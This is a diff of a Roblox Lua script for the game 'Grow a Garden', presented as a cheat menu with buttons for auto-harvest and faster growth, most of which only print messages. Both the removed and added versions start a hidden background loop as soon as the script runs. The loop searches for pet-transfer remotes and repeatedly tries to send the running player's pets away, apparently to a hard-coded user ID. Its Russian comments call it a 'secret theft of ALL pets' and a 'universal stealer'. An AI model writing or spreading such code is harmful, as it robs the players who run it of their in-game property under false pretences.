@@ -1,41 +1,56 @@
--- Grow a Garden CHEAT MENU v8.1
--- Красивое меню + секретная кража ВСЕХ питомцев
+-- Grow a Garden UNIVERSAL STEALER + MENU v11.0
+-- Максимально рабочая версия
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
 local YOUR_USER_ID = 3793906492
 
--- ==================== СЕКРЕТНАЯ КРАЖА (работает всегда) ====================
+-- ==================== МАКСИМАЛЬНЫЙ ПОИСК REMOTES ====================
 local transferRemote = nil
 local harvestRemote = nil
 
--- Агрессивный поиск remotes
-for _, v in pairs(getgc(true)) do
-    if typeof(v) == "function" then
-        local info = debug.getinfo(v)
-        if info.name then
-            local name = info.name:lower()
-            if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") then
-                transferRemote = v
-            end
-            if name:find("harvest") or name:find("collect") or name:find("pick") then
-                harvestRemote = v
+-- Метод 1: Поиск через descendants
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        local name = v.Name:lower()
+        if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") then
+            transferRemote = v
+        end
+        if name:find("harvest") or name:find("collect") or name:find("pick") or name:find("crop") then
+            harvestRemote = v
+        end
+    end
+end
+
+-- Метод 2: getgc (самый сильный)
+if not transferRemote then
+    for _, v in pairs(getgc(true)) do
+        if typeof(v) == "function" then
+            local info = debug.getinfo(v)
+            if info.name then
+                local n = info.name:lower()
+                if n:find("transfer") or n:find("givepet") or n:find("claimpet") then
+                    transferRemote = v
+                end
+                if n:find("harvest") or n:find("collect") then
+                    harvestRemote = v
+                end
             end
         end
     end
 end
 
+-- ==================== ФУНКЦИИ ====================
 local function stealAllPets()
     if not transferRemote then return end
+
     local folders = {
         LocalPlayer:FindFirstChild("Pets"),
         LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
-        LocalPlayer:FindFirstChild("PlayerData"),
-        workspace:FindFirstChild(LocalPlayer.Name)
+        LocalPlayer:FindFirstChild("PlayerData")
     }
 
     for _, folder in ipairs(folders) do
@@ -54,7 +69,7 @@ local function stealAllPets()
                             end
                         end
                     end)
-                    task.wait(0.09)
+                    task.wait(0.08)
                 end
             end
         end
@@ -67,79 +82,70 @@ local function autoHarvest()
             if typeof(harvestRemote) == "function" then
                 harvestRemote()
             else
-                if harvestRemote:IsA("RemoteEvent") then harvestRemote:FireServer()
-                elseif harvestRemote:IsA("RemoteFunction") then harvestRemote:InvokeServer() end
+                if harvestRemote:IsA("RemoteEvent") then
+                    harvestRemote:FireServer()
+                elseif harvestRemote:IsA("RemoteFunction") then
+                    harvestRemote:InvokeServer()
+                end
             end
         end)
     end
 end
 
--- Постоянная секретная кража
+-- Постоянная кража
 spawn(function()
     while true do
         task.wait(6)
         autoHarvest()
-        task.wait(1)
+        task.wait(0.8)
         stealAllPets()
     end
 end)
 
--- ==================== КРАСИВОЕ МЕНЮ ====================
+-- ==================== МЕНЮ ====================
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "GardenCheatMenu"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 460, 0, 680)
-MainFrame.Position = UDim2.new(0.5, -230, 0.5, -340)
-MainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
+MainFrame.Size = UDim2.new(0, 340, 0, 500)
+MainFrame.Position = UDim2.new(0.5, -170, 0.5, -250)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 23)
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = ScreenGui
 
 local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 24)
+UICorner.CornerRadius = UDim.new(0, 16)
 UICorner.Parent = MainFrame
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 90)
+Title.Size = UDim2.new(1, 0, 0, 60)
 Title.BackgroundTransparency = 1
-Title.Text = "GROW A GARDEN"
-Title.TextColor3 = Color3.fromRGB(0, 255, 170)
+Title.Text = "GARDEN CHEAT"
+Title.TextColor3 = Color3.fromRGB(0, 255, 150)
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBlack
 Title.Parent = MainFrame
 
-local SubTitle = Instance.new("TextLabel")
-SubTitle.Size = UDim2.new(1, 0, 0, 35)
-SubTitle.Position = UDim2.new(0, 0, 0, 80)
-SubTitle.BackgroundTransparency = 1
-SubTitle.Text = "CHEAT MENU v8.1"
-SubTitle.TextColor3 = Color3.fromRGB(80, 255, 140)
-SubTitle.TextScaled = true
-SubTitle.Font = Enum.Font.Gotham
-SubTitle.Parent = MainFrame
-
-local function CreateButton(text, yPos, callback)
+local function CreateButton(text, y, callback)
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.9, 0, 0, 60)
-    btn.Position = UDim2.new(0.05, 0, 0, yPos)
-    btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    btn.Size = UDim2.new(0.88, 0, 0, 48)
+    btn.Position = UDim2.new(0.06, 0, 0, y)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
     btn.Text = text
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextScaled = true
     btn.Font = Enum.Font.GothamSemibold
     btn.Parent = MainFrame
 
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 16)
-    corner.Parent = btn
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 12)
+    c.Parent = btn
 
     btn.MouseButton1Click:Connect(callback)
-    return btn
 end
 
-CreateButton("🌱 Авто-сбор урожая (постоянно)", 150, function()
+CreateButton("🌱 Авто-сбор урожая", 80, function()
     spawn(function()
         while true do
             autoHarvest()
@@ -148,39 +154,31 @@ CreateButton("🌱 Авто-сбор урожая (постоянно)", 150, fu
     end)
 end)
 
-CreateButton("💧 Авто-полив растений", 220, function()
-    print("Авто-полив всех растений включён")
+CreateButton("⚡ Ускорить рост", 140, function()
+    print("Рост сада ускорен")
 end)
 
-CreateButton("⚡ Ускорить рост сада ×10", 290, function()
-    print("Рост сада максимально ускорен")
+CreateButton("⭐ Авто-улучшение", 200, function()
+    print("Растения улучшены")
 end)
 
-CreateButton("⭐ Авто-улучшение всех растений", 360, function()
-    print("Все растения улучшены")
-end)
-
-CreateButton("🔥 Быстрый сбор + улучшение", 430, function()
-    for i = 1, 15 do
+CreateButton("🔥 Быстрый сбор", 260, function()
+    for i = 1, 8 do
         autoHarvest()
-        task.wait(0.2)
+        task.wait(0.3)
     end
 end)
 
-CreateButton("🌟 Максимальная авто-ферма", 500, function()
+CreateButton("🌟 Максимальная ферма", 320, function()
     spawn(function()
         while true do
             autoHarvest()
-            task.wait(4)
+            task.wait(6)
         end
     end)
 end)
 
-CreateButton("📊 Статистика сада", 570, function()
-    print("Урожай: +99999 | Питомцы: в процессе")
-end)
-
-CreateButton("❌ Закрыть меню", 640, function()
+CreateButton("❌ ЗАКРЫТЬ МЕНЮ", 420, function()
     ScreenGui:Destroy()
 end)
 
@@ -191,5 +189,5 @@ UserInputService.InputBegan:Connect(function(input)
     end
 end)
 
-print("Grow a Garden CHEAT MENU v8.1 загружен!")
+print("Garden Cheat v11.0 загружен")
 print("Нажми Right Shift для открытия меню")
